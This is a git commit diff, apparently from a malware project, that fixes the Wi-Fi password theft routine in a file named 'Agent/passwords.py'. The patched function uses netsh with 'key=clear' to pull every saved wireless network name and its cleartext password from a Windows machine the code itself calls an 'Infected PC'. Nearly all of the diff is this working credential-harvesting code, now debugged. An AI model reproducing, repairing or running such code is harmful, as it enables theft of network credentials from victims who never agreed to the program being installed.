80f85730339ee2c1c092f2c9d1a299e2cf34e37c
Frederik Mees <Fredjemees@gmail.com>
2020-02-12 19:49:22 +0100

    wifi_passwords bugfix Windows

--- Agent/passwords.py
+++ Agent/passwords.py
@@ -62,22 +62,21 @@ def getWifiPasswords():
     if os.name == 'nt':
         try:
             data_list = []
-
-            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('n')
-            profiles = [i.split(':')[1][1:-1] for i in data if 'All User Profile' in i]
+            data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+            profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
 
             for i in profiles:
-                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', i, 'key=clear']).decode('utf-8').split('n')
-                results = [b.split(':')[1][1:-1] for b in results if 'Key Content' in b]
+                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
+                        'utf-8').split('\n')
+                results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
                 try:
-                    data_list.append('{:<30}|  {:<}').format(i, results[0])
-                except:
-                    data_list.append('{:<30}|  {:<}').format(i, '')
+                    data_list.append("{:<30}|  {:<}".format(i, results[0]))
+                except Exception:
+                    data_list.append("{:<30}|  {:<}".format(i, ""))
 
             return data_list
-
         except Exception as e:
-            return ['getWifiPasswords failed with Exception %s' % str(e)]
+            return ["getWifiPasswords failed with exception " + str(e)]
     else:
         return ['Infected PC is not Windows based, so cannot fetch wifi data for now.']
 
